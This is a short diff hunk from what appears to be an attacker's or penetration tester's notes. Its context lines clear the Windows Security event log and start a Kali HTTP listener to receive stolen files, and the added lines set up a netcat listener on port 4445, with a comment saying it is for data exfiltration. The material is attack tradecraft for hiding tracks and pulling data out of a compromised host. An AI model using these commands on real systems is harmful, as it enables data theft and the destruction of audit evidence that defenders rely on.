@@ -649,6 +649,8 @@ Clear-EventLog -LogName Security
 # Kali — receive the file (simple HTTP listener instead of a raw nc socket)
 python3 -m http.server 8000 &
 # or a small script that accepts POST and saves the body, if a true upload endpoint is wanted
+# we can using netcat command for executing data exfiltration
+nc -lvnp 4445 
 ```
 
 ```powershell
